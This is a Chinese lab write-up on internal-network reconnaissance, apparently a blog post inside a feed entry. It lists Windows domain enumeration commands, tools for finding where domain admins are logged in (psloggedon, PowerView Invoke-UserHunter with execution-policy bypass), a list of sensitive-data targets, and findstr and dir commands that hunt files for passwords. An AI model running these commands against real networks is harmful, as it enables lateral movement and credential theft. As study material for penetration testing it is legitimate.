+<p>net group &quot;domain computers&quot; /domain</p>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811191807380.png" alt="image-20230811191807380" loading="lazy"></figure>
+<h3 id="查询域内所有用户组列表">查询域内所有用户组列表</h3>
+<p>net group /domain</p>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811191921891.png" alt="image-20230811191921891" loading="lazy"></figure>
+<h3 id="获取域信任信息">获取域信任信息</h3>
+<p>nltest /domain_trusts</p>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811192229674.png" alt="image-20230811192229674" loading="lazy"></figure>
+<h2 id="定位域控的位置">定位域控的位置</h2>
+<h3 id="查看域控制器的机器名">查看域控制器的机器名</h3>
+<p>nltest /DCLIST:f9f</p>
+<figure data-type="image" tabindex="11"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811192535521.png" alt="image-20230811192535521" loading="lazy"></figure>
+<h3 id="查看域控制器的主机名">查看域控制器的主机名</h3>
+<p>nslookup -type=SRV _ldap._tcp</p>
+<figure data-type="image" tabindex="12"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811192739126.png" alt="image-20230811192739126" loading="lazy"></figure>
+<h3 id="查看当前时间">查看当前时间</h3>
+<p>net time /doamin</p>
+<figure data-type="image" tabindex="13"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811192839904.png" alt="image-20230811192839904" loading="lazy"></figure>
+<h3 id="查看域控制器组">查看域控制器组</h3>
+<p>net group &quot;Domain controllers&quot; /domain</p>
+<figure data-type="image" tabindex="14"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811192948353.png" alt="image-20230811192948353" loading="lazy"></figure>
+<h2 id="获取域内用户">获取域内用户</h2>
+<h3 id="向域控制器进行查询">向域控制器进行查询</h3>
+<p>net user /domain</p>
+<figure data-type="image" tabindex="15"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811194352086.png" alt="image-20230811194352086" loading="lazy"></figure>
+<p>知道用户就可以进行一些密码喷洒，爆破</p>
+<h3 id="查询域管理用户">查询域管理用户</h3>
+<p>net group &quot;domain admins&quot; /domain</p>
+<figure data-type="image" tabindex="16"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811194324105.png" alt="image-20230811194324105" loading="lazy"></figure>
+<h3 id="查询域管理员用户组">查询域管理员用户组</h3>
+<p>net group &quot;enterprise admins&quot; /domain</p>
+<figure data-type="image" tabindex="17"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811194446870.png" alt="image-20230811194446870" loading="lazy"></figure>
+<p>举一反三可以查各个组内用户</p>
+<h2 id="定位域管理员">定位域管理员</h2>
+<p>内网渗透时优先攻击域管理员登入过的电脑，这样内存中可能存在一些票据，hash</p>
+<figure data-type="image" tabindex="18"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811195354176.png" alt="image-20230811195354176" loading="lazy"></figure>
+<p>这是域内一台电脑，且域管登录</p>
+<p>hostname f9f4</p>
+<figure data-type="image" tabindex="19"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811195442076.png" alt="image-20230811195442076" loading="lazy"></figure>
+<p>这是域内另一台，普通用户登录</p>
+<figure data-type="image" tabindex="20"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811195749431.png" alt="image-20230811195749431" loading="lazy"></figure>
+<p>这是第三台域内机，f9f2,用户登录</p>
+<p>然后用到一个工具</p>
+<h3 id="psloggedomexe工具">psloggedom.exe工具</h3>
+<p>psloggedon.exe 可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如 果指定了用户名而不是计算 机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前 是否已登录。</p>
+<p><strong>用法：psloggedon.exe [-] [-l] [-x] [\computername或username]</strong></p>
+<figure data-type="image" tabindex="21"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231131017.png" alt="image-20230811231131017" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231526175.png" alt="image-20230811231526175" loading="lazy"></figure>
+<p>第一次报错</p>
+<p>需要在后面加这个参数  因为第一次运行它会弹窗需要我们点accept</p>
+<figure data-type="image" tabindex="23"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231543940.png" alt="image-20230811231543940" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231708476.png" alt="image-20230811231708476" loading="lazy"></figure>
+<p>成功定位</p>
+<figure data-type="image" tabindex="25"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231809100.png" alt="image-20230811231809100" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231820650.png" alt="image-20230811231820650" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811231950632.png" alt="image-20230811231950632" loading="lazy"></figure>
+<h3 id="pvedfindaduserexe">PVEDFindADUser.exe</h3>
+<p>pveFindADUser.exe 可用于查找 AD用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户， 包括本地用户、通过RDP 登录的用户、用于运行服务和计划任务的用户账</p>
+<p>用法：pvefindaduser.exe -current</p>
+<figure data-type="image" tabindex="28"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811233254286.png" alt="image-20230811233254286" loading="lazy"></figure>
+<p>我这里用不了</p>
+<p>正常结果应该会这样</p>
+<figure data-type="image" tabindex="29"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811233321595.png" alt="image-20230811233321595" loading="lazy"></figure>
+<h3 id="netviewexe">netview.exe</h3>
+<p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统</p>
+<p>用法：</p>
+<p>-h：显示帮助菜单。</p>
+<p>-f filename.txt：指定从中提取主机列表的文件。</p>
+<p>-e filename.txt：指定要排除的主机名文件。 -o filename.txt：将所有输出重定向到文件。</p>
+<p>-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。</p>
+<p>-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</p>
+<p>-c：检查对已找到共享的访问权限</p>
+<figure data-type="image" tabindex="30"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811233617538.png" alt="image-20230811233617538" loading="lazy"></figure>
+<p>通过cs上传</p>
+<figure data-type="image" tabindex="31"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811233945976.png" alt="image-20230811233945976" loading="lazy"></figure>
+<p>没查出来</p>
+<p>查出来一般是这样</p>
+<figure data-type="image" tabindex="32"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811234007137.png" alt="image-20230811234007137" loading="lazy"></figure>
+<h3 id="powerview脚本">PowerView脚本</h3>
+<p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、 Invoke-UserHunter 等，</p>
+<p>用法：</p>
+<p>powershell.exe -exec bypass -command &quot;&amp; { import-module .\PowerView.ps1;Invoke-UserHunter}&quot;</p>
+<figure data-type="image" tabindex="33"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811234604307.png" alt="image-20230811234604307" loading="lazy"></figure>
+<p>先上传</p>
+<figure data-type="image" tabindex="34"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811234649360.png" alt="image-20230811234649360" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230811234704475.png" alt="image-20230811234704475" loading="lazy"></figure>
+<p>不通权限下查询到的结果是不同的</p>
+<p>这里我用的是f9f3普通用户</p>
+<h2 id="敏感数据定位">敏感数据定位</h2>
+<p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术 数据等。</p>
+<p>可以说，价值较高的数据基本都在内网中 重点核心业务机器</p>
+<p>高级管理人员</p>
+<p>系统管理人员</p>
+<p>财务/人事/业务人员的个人计算机</p>
+<p>产品管理系统服务器</p>
+<p>办公系统服务器</p>
+<p>财务应用系统服务器</p>
+<p>核心产品源码服务器（SVN/GIT服务器）</p>
+<p>数据库服务器 文件服务器，</p>
+<p>共享服务器</p>
+<p>电子邮件服务器</p>
+<p>网站监控系统服务器</p>
+<p>信息安全监控服务器</p>
+<p>生产工厂服务器</p>
+<p>站点源码备份文件，</p>
+<p>数据库备份文件等等</p>
+<p>游览器保存的密码和游览器的cookie</p>
+<p>其他用户会话，</p>
+<p>3389和ipc$连接记录，</p>
+<p>回收站中的信息等等 Windows的无线密码</p>
+<p>网络内部的各种账号密码，</p>
+<p>包含电子邮箱，V**，FTP等等</p>
+<p><strong>1.指定目录下搜集各类敏感文件</strong></p>
+<p>dir /a /s /b d:&quot;*.txt&quot; *</p>
+<p><em>dir /a /s /b d:&quot;</em>.xml&quot;</p>
+<p>dir /a /s /b d:&quot;*.mdb&quot; *</p>
+<p><em>dir /a /s /b d:&quot;</em>.sql&quot;</p>
+<p>dir /a /s /b d:&quot;*.mdf&quot; *</p>
+<p><em>dir /a /s /b d:&quot;</em>.eml&quot;</p>
+<p>dir /a /s /b d:&quot;*.pst&quot; *</p>
+<p>*dir /a /s /b d:&quot;<em>conf</em>&quot; *</p>
+<p>*dir /a /s /b d:&quot;<em>bak</em>&quot; *</p>
+<p>*dir /a /s /b d:&quot;<em>pwd</em>&quot; *</p>
+<p>*dir /a /s /b d:&quot;<em>pass</em>&quot; *</p>
+<p>*dir /a /s /b d:&quot;<em>login</em>&quot; *</p>
+<p>*dir /a /s /b d:&quot;<em>user</em></p>
+<p><strong>2.指定目录下的文件中搜集各种账号密码</strong></p>
+<p>findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi</p>
+<p>findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml</p>
+<p>findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</p>
+<p>findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</p>
+<p>findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</p>
+<p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包 括个人数据及组织的业务数据、技术数据等。可以说，价 值较高的数据基本都在内网中</p>
+]]></content>
+    </entry>
+</feed>
